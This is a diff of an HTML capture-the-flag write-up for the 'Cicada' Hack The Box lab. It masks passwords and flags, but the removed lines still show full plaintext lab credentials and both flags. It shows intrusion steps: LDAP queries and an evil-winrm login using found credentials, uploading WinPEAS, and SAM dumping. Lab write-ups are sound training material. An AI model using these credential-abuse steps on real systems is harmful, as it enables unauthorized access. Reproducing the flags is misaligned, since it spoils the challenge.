@@ -289,7 +289,7 @@ SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC 
 SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1109: CICADA<span style="color:#ae81ff">\D</span>ev Support <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
 SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1601: CICADA<span style="color:#ae81ff">\e</span>mily.oscars <span style="color:#f92672">(</span>SidTypeUser
 </code></pre></div><p>Trying the usernames i found that the correct one was <strong>michael.wrightson</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ldapsearch -x -H ldap://cicada.htb -D <span style="color:#e6db74">&#34;Cicada\\michael.wrightson&#34;</span> -w <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> -b <span style="color:#e6db74">&#34;DC=cicada,DC=htb&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ldapsearch -x -H ldap://cicada.htb -D <span style="color:#e6db74">&#34;Cicada\\michael.wrightson&#34;</span> -w <span style="color:#e6db74">&#39;Cicada**********&#39;</span> -b <span style="color:#e6db74">&#34;DC=cicada,DC=htb&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>
 </code></pre></div><ol>
 <li>
 <p><strong><code>ldapsearch</code></strong>: This is the command-line utility used to search an LDAP directory.</p>
@@ -337,7 +337,7 @@ $sourceDirectory <span style="color:#f92672">=</span> <span style="color:#e6db74
 $destinationDirectory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;D:\Backup&#34;</span>
 
 $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;emily.oscars&#34;</span>
-$password <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> -AsPlainText -Force
+$password <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;Q!3@Lp*******&#34;</span> -AsPlainText -Force
 $credentials <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span>$username, $password<span style="color:#f92672">)</span>
 $dateStamp <span style="color:#f92672">=</span> Get-Date -Format <span style="color:#e6db74">&#34;yyyyMMdd_HHmmss&#34;</span>
 $backupFileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;smb_backup_</span>$dateStamp<span style="color:#e6db74">.zip&#34;</span>
@@ -373,9 +373,9 @@ smb: <span style="color:#ae81ff">\&gt;</span>
 
 </code></pre></div><p>Navigate to emily.oscars' Desktop folder and you&rsquo;ll find the user flag:</p>
 <p><img src="attachment/eb966126c503e2aac24c0c3b2378726a.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:b1a85553011c051272b8b9bbf05a7258
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:b1a85553011************
 </code></pre></div><p>Use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> to log in the system</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">evil-winrm -i cicada.htb -u emily.oscars -p <span style="color:#e6db74">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> -s /path/to/local/Winpeas.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">evil-winrm -i cicada.htb -u emily.oscars -p <span style="color:#e6db74">&#39;Q!3@L*****&#39;</span> -s /path/to/local/Winpeas.exe
 </code></pre></div><p><img src="attachment/9795d07b42e23b355bb6731828e14690.png" alt=""></p>
 <p><img src="attachment/c8d3469c66416e2e25100a64545dbb13.png" alt="">
 With crackmapexec we can dump the SAM database:</p>
@@ -414,7 +414,7 @@ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</spa
 </code></pre></div><p><img src="attachment/6c4e7fc15c5e909ebca94f90ff258d6e.png" alt=""></p>
 <p>Then get root.txt in <strong>C:\Users\Administrator\Desktop&gt;</strong></p>
 <p><img src="attachment/1b649ffb4e75f05397d31a254f89ee84.png" alt=""></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:03875ddc5ded5559275b9be9ca9d0dd3
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rootflag:03875ddc5ded55********
 </code></pre></div>
       </div>
     </article>
